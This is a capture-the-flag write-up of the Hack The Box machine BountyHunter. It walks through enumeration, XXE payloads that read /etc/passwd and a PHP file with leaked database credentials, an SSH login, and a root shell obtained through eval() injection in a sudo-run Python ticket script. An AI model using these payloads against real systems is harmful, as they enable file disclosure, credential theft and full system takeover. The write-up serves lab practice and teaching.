---
title: "HTB Write-up: Bounty Hunter" 
date: "2025-04-15"
author: "Bruno Lamela"
category: "Hack The Box Easy"
image: ./img/htb.png
---

<br><br>



## BountyHunter 

**BountyHunter** is an easy Linux machine that uses XML external entity injection to read system files. Being able to read a PHP file where credentials are leaked gives the opportunity to get a foothold on system as development user. A message from John mentions a contract with Skytrain Inc and states about a script that validates tickets. Auditing the source code of the python script reveals that it uses the eval function on ticket code, which can be injected, and as the python script can be run as root with sudo by the development user it is possible to get a root shell.

---

## Machine Informations

- **IP**: `10.10.11.100`
- **Difficulty**: Easy
- **Type**: Linux
- **Status**: Completed

---

## 1. Machine Discovery

The first step is to discover open services and ports. For this we use a **Nmap scan**.

### Command Nmap

```bash
nmap -sC -sV -p- -v 10.10.11.100

```
![Resultado do Nmap](./img/Bounty_Hunter/nmap_bounty_hunter.png)


## 🔍 2. Machine Discovery

After identifying that port **80** was open from the Nmap scan, we navigated to the target IP in our browser:

![Portal Page](./img/Bounty_Hunter/xxe_page.png)

---

### 🌐 Web Exploration

While exploring the site, we discovered the following path:

- **`portal.php`** → This page prompted the user to **click a link** to continue.

- **`log_submit.php`** → Clicking the link led us here. This page contained a form labeled:

> 🧪 **Bounty Report System - Beta**

---

### 📝 Bug Bounty Form Structure

The form consisted of several text fields that looked like this:

```text
Exploit Title
CWE
CVSS Score
Bounty Reward ($)
```

## 🗂️ 3. Discovering Hidden Files with Ffuf

After confirming the presence of a web application and identifying the files `portal.php` and `log_submit.php`, we decided to enumerate other potentially hidden or sensitive files using **ffuf**.

### 🔍 Fuzzing with Ffuf

We used the following command to scan the webserver:

```bash
ffuf -u http://10.10.11.100/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php
```

This allowed us to brute-force directories and file names, particularly targeting `.php` files.



### 📂 Discovery: `db.php`

During the scan, ffuf revealed a file named:

> `db.php`

The name `db.php` suggested that it might include:

- 🧠 Database configuration or logic
- 🔐 Hardcoded credentials
- 🛠️ Sensitive backend functionality

Given the potential impact, this file became a **primary target** for further investigation in our exploitation phase.


## 4. XXE Vulnerability & XML Analysis

Using Burp Suite, we intercepted the request made when submitting the form on log_submit.php.
Upon analyzing the request and its response, we noticed that the data being returned was URL-encoded and Base64-encoded.

After decoding it, we discovered that the application was actually handling the input as XML behind the scenes — confirming our suspicion of an XML parser being used on the backend.

![Resultado do ffuf](./img/Bounty_Hunter/burp-request-decode.png)


## 5. Exploiting XXE to Read Sensitive Files

After confirming that the form on `log_submit.php` parsed user input as XML, we crafted a custom XXE payload to exploit the vulnerability.

🧪 First Payload – Reading /etc/passwd
We submitted the following XML payload through Burp Suite (inside one of the text fields):

---
```bash
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE exploit [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<exploit>
    <title>&xxe;</title>
    <cwe>test</cwe>
    <cvss>5.0</cvss>
    <reward>100</reward>
</exploit>
```
---


After decoding the response (which was Base64 + URL encoded), we retrieved the contents of /etc/passwd.

This revealed the existence of a user called development, which hinted at a low-privileged user on the system.

🧪 Second Payload – Reading db.php Using php://filter

Next, we leveraged the php://filter stream wrapper to read the source code of the previously discovered db.php file in Base64:

---

```bash
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE exploit [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php">
]>
<exploit>
    <title>&xxe;</title>
    <cwe>test</cwe>
    <cvss>5.0</cvss>
    <reward>100</reward>
</exploit>
```
---

After decoding the response again, we found hardcoded credentials in the source code, such as:


---
```bash
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>

```
---



## 6. Accessing SSH with the Credentials

With the credentials (development: m19RoAU0hP41A1sTsq6K) obtained from the db.php file, we proceeded to log into the target machine via SSH.

We used the following command:

---
```bash
ssh development@10.10.11.100

```
---

When prompted for the password, we entered:

---
```bash
m19RoAU0hP41A1sTsq6K
```
---

This successfully authenticated us as the development user on the machine.


## 7. Privilege Escalation

After gaining access to the development user and exploring the machine, we found two key files: user.txt (which contained the user flag) and contract.txt. The contents of contract.txt indicated that there were tickets failing validation, and someone had set up permissions to investigate the issue. Specifically, the Skytrain Inc Ticket Validation System was mentioned.

Upon running sudo -l, we discovered that the development user had permission to run the script ticketValidator.py as root:

---
```bash
User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py

```
---

**Ticket Validation Vulnerability**
The code in ticketValidator.py was parsing ticket files and evaluating the ticket code. The critical part of the code was the following:

---
```bash
ticketCode = x.replace("**", "").split("+")[0]
if int(ticketCode) % 7 == 4:
    validationNumber = eval(x.replace("**", ""))
    if validationNumber > 100:
        return True
    else:
        return False

```
---

The code used the eval() function, which allowed arbitrary Python code to be executed. This presented an opportunity for code injection.

**Crafting the Malicious Ticket**
To exploit this, we created a malicious ticket with a payload.md file containing the following code:

---
```bash
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**4+__import__('os').system('sudo /bin/bash')+200**
##Issued: 2025/04/15
#End Ticket

```
---

This payload injected the command sudo /bin/bash into the ticketCode, which was then executed as root when the eval() function processed it.

**Gaining Root Access**
Running the script with the malicious ticket caused the system to execute the payload, and we were granted root shell access, effectively giving us full control over the machine.


